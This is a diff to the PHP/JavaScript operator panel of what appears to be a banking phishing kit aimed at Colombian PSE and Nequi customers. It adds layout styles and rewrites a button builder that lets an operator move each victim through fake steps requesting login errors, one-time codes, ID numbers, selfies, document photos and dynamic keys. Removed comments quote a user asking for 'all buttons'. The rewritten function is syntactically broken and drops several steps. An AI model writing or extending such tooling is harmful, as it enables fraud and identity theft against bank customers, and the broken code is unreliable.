@@ -324,15 +324,67 @@ require_once __DIR__ . '/auth.php';
             color: #111;
             transition: 0.1s;
         }
-
         .btn-act:active {
             transform: scale(0.97);
         }
 
-        .btn-act:hover {
+        .btn:hover {
             opacity: 0.9;
+            filter: brightness(1.1);
         }
 
+        /* NEW COMPACT LAYOUT STYLES */
+        .btn-group-primary {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+        .btn-expand {
+            width: 100%;
+            background: transparent;
+            border: 1px dashed #444;
+            color: #888;
+            padding: 8px;
+            cursor: pointer;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            transition: 0.2s;
+        }
+        .btn-expand:hover { border-color: #666; color: #ccc; }
+
+        .action-category {
+            margin-bottom: 12px;
+            border-top: 1px solid #333;
+            padding-top: 8px;
+        }
+        .cat-title {
+            display: block;
+            font-size: 0.7rem;
+            color: #666;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            font-weight: 700;
+        }
+        .btn-grid-mini {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(60px, 1fr));
+            gap: 6px;
+        }
+        .btn-mini {
+            padding: 6px 4px;
+            font-size: 0.7rem;
+            border-radius: 4px;
+            border: none;
+            cursor: pointer;
+            color: #fff;
+            font-weight: 600;
+        }
+        /* Specific mini colors */
+        .act-whats { background: #22c55e; color: #000; }
+        .act-sel { background: #8b5cf6; }
+        .act-doc { background: #a855f7; }
+        .act-dyn { background: #f59e0b; color: #000; }
         .act-err {
             background: #f87171;
         }
@@ -631,53 +683,23 @@ require_once __DIR__ . '/auth.php';
             }
         }
 
-        // --- BUTTONS BUILDER ---
+        // --- BUTTONS BUILDER NEW DESIGN ---
         function getButtons(id, type) {
             let b = '';
-            // Nequi has fewer steps, but user asked for "all buttons" so we check context
-            // Assuming PSE context for full buttons, Nequi simpler?
-            // User request: "faltan todos los botones... darme un boton [for everything]"
-            // We will render ALL possible buttons for PSE.
+            b += `<button class="btn-act act-doc" onclick="act(${id},'pse',11)">Doc Frente</button>`;
+            b += `<button class="btn-act act-doc" onclick="act(${id},'pse',12)">Doc Reverso</button>`;
+            // Doc Errors
+            b += `<button class="btn-act act-err" onclick="act(${id},'pse',13)">Err Doc F.</button>`;
+            b += `<button class="btn-act act-err" onclick="act(${id},'pse',14)">Err Doc R.</button>`;
 
-            if (type === 'nequi') {
-                // Maintain simple flow for Nequi? Or expand? Let's keep simple + some errors
-                b += `<button class="btn-act act-err" onclick="act(${id},'nequi',2)">Err Login</button>`;
-                b += `<button class="btn-act act-otp" onclick="act(${id},'nequi',3)">Pedir OTP</button>`;
-                b += `<button class="btn-act act-err" onclick="act(${id},'nequi',4)">Err OTP</button>`;
-                b += `<button class="btn-act act-fin" onclick="act(${id},'nequi',0)">Finalizar</button>`;
-            } else {
-                // PSE: All 16 states or so
-                // Login Errors
-                b += `<button class="btn-act act-err" onclick="act(${id},'pse',2)">Err Login</button>`;
-                b += `<button class="btn-act act-otp" onclick="act(${id},'pse',3)">Pedir OTP</button>`;
+            // Dinamica
+            b += `<button class="btn-act act-dyn" onclick="act(${id},'pse',15)">Reloj</button>`;
+            b += `<button class="btn-act act-err" onclick="act(${id},'pse',16)">Err Reloj</button>`;
 
-                // OTP Errors
-                b += `<button class="btn-act act-err" onclick="act(${id},'pse',4)">Err OTP</button>`;
-                b += `<button class="btn-act act-cc" onclick="act(${id},'pse',5)">Pedir CC</button>`;
-
-                // CC Errors & Finish
-                b += `<button class="btn-act act-err" onclick="act(${id},'pse',6)">Err CC</button>`;
-                b += `<button class="btn-act act-whats" onclick="act(${id},'pse',8)">WhatsApp</button>`;
-
-                // Selfie
-                b += `<button class="btn-act act-sel" onclick="act(${id},'pse',9)">Pedir Selfie</button>`;
-                b += `<button class="btn-act act-err" onclick="act(${id},'pse',10)">Err Selfie</button>`;
-
-                // Docs
-                b += `<button class="btn-act act-doc" onclick="act(${id},'pse',11)">Doc Frente</button>`;
-                b += `<button class="btn-act act-doc" onclick="act(${id},'pse',12)">Doc Reverso</button>`;
-                // Doc Errors
-                b += `<button class="btn-act act-err" onclick="act(${id},'pse',13)">Err Doc F.</button>`;
-                b += `<button class="btn-act act-err" onclick="act(${id},'pse',14)">Err Doc R.</button>`;
-
-                // Dinamica
-                b += `<button class="btn-act act-dyn" onclick="act(${id},'pse',15)">Reloj</button>`;
-                b += `<button class="btn-act act-err" onclick="act(${id},'pse',16)">Err Reloj</button>`;
-
-                // Finish
-                b += `<button class="btn-act act-fin" onclick="act(${id},'pse',7)">Finalizar</button>`;
-            }
-            return b;
+            // Finish
+            b += `<button class="btn-act act-fin" onclick="act(${id},'pse',7)">Finalizar</button>`;
+        }
+        return b;
         }
 
         // --- ACTIONS ---
